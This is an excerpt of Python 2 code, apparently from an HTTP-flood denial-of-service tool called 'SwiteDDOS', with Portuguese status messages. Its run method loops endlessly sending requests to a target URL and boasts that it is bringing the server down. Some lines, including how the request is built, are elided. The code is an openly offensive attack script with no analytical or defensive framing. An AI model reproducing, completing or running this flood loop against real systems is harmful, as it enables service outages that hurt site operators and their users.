    ...
    def run(self):
        ...
        while True:
            try:
                ...
                urllib2.urlopen(req)
                count += 1
                print ("{0} SwiteDDOS está colocando o servidor para baixo!".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m SERVIDOR ESTA CAINDO.. \033[1;m")
                pass
            except urllib2.URLError:
                print ("\033[1;34m ATTACK SENDO EXECUTADO! \033[1;m")
                sys.exit()
            except ValueError:
                print ("\033[1;34m URL DIGITADO É INVALIDO. \033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-] Cancelado \033[1;m")
                sys.exit()
